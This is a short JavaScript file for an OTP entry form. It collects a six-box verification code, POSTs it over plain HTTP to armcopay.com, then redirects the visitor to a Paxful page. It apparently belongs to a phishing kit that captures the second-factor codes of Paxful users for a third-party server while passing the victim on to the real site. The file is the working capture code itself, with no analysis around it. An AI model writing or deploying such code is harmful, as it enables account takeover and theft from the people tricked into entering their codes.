document.addEventListener("DOMContentLoaded", function () {
  const otpInputs = Array.from(document.querySelectorAll("#otp input"));

  otpInputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      const value = e.target.value;

      if (value.match(/[0-9]/) && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }

      if (index === otpInputs.length - 1 && value !== "") {
        // If the last digit is entered, send the complete OTP
        const otp = otpInputs.map((input) => input.value).join("");
        sendDataToBackend(otp);
      }
    });
  });

  function sendDataToBackend(otp) {
    // Perform your backend call here
    fetch("http://armcopay.com/api/v1/otpp", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ otp }),
    })
      .then((response) => {
        if (response.ok) {
          // Redirect to "https://paxful.com/pcm" upon successful OTP verification
          window.location.href = "https://paxful.com/pcm";
        } else {
          console.error("Error sending data to the backend");
          // Handle error if needed
        }
      })
      .catch((error) => {
        console.error("Error sending data to the backend:", error.message);
        // Handle error if needed
      });
  }
});
